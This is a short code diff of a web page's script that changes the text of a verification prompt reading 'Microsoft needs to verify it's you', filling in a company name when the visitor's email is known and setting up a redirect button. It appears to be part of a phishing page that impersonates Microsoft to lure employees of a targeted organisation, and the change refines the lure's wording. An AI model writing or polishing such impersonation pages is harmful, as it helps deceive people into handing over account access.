@@ -29,7 +29,7 @@
                 document.getElementById('message').innerHTML = `To access ${companyName} secured data, Microsoft needs to verify it's you.`;
             } else {
                 // If no email found, show the default message
-                document.getElementById('message').innerHTML = "To access secured data, Microsoft needs to verify it's you.";
+                document.getElementById('message').innerHTML = "To access your organization secured data, Microsoft needs to verify it's you.";
             }
 
             // Set up the button click handler for redirection
